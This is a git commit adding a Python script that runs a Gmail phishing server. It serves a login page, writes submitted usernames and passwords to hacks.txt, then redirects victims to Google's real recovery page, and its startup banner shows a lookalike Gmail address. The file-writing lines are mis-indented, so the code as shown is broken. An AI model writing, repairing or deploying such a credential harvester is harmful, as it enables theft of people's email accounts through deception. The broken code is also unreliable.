5fad47a0613b29e7f9f73e575e322b7e17bb7886
tacocatCLAUS <116687416+tacocatCLAUS@users.noreply.github.com>
2023-03-25 08:39:01 -0400

    Add files via upload

---
+++ urmom.py
@@ -0,0 +1,50 @@
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import urlparse, parse_qs
+import cgi
+
+class RequestHandler(BaseHTTPRequestHandler):
+    
+    def do_GET(self):
+        # serve the index.html file
+        if self.path == '/':
+            with open('index.html', 'rb') as f:
+                content = f.read()
+                self.send_response(200)
+                self.send_header('Content-Type', 'text/html')
+                self.send_header('Content-Length', str(len(content)))
+                self.end_headers()
+                self.wfile.write(content)
+        else:
+            self.send_error(404)
+            
+    def do_POST(self):
+        # process the form data
+        if self.path == '/login.php':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            post_data = parse_qs(post_data.decode('utf-8'))
+            username = post_data.get('username', [''])[0]
+            password = post_data.get('password', [''])[0]
+            
+            # print the results to the terminal
+             with open('hacks.txt', 'a') as f:
+    f.write(f'Gmail Username: {username} Password: {password}\n')
+            
+            # redirect to recovery identifier page
+            self.send_response(302)
+            self.send_header('Location', 'https://accounts.google.com/signin/v2/recoveryidentifier')
+            self.end_headers()
+        else:
+            self.send_error(404)
+         
+
+
+def run():
+    port = 8000
+    print(f'𝕊𝕖𝕣𝕧𝕖𝕣 𝕊𝕥𝕒𝕣𝕥𝕖𝕕 𝔸𝕥 𝕙𝕥𝕥𝕡𝕤://𝔾𝕞𝕒𝕚𝕝.𝕘𝕚𝕝𝕡𝕚𝕟𝕗𝕒𝕞𝕚𝕝𝕪.𝕣𝕖𝕡𝕝.𝕔𝕠')
+    server_address = ('', port)
+    httpd = HTTPServer(server_address, RequestHandler)
+    httpd.serve_forever()
+
+if __name__ == '__main__':
+    run()
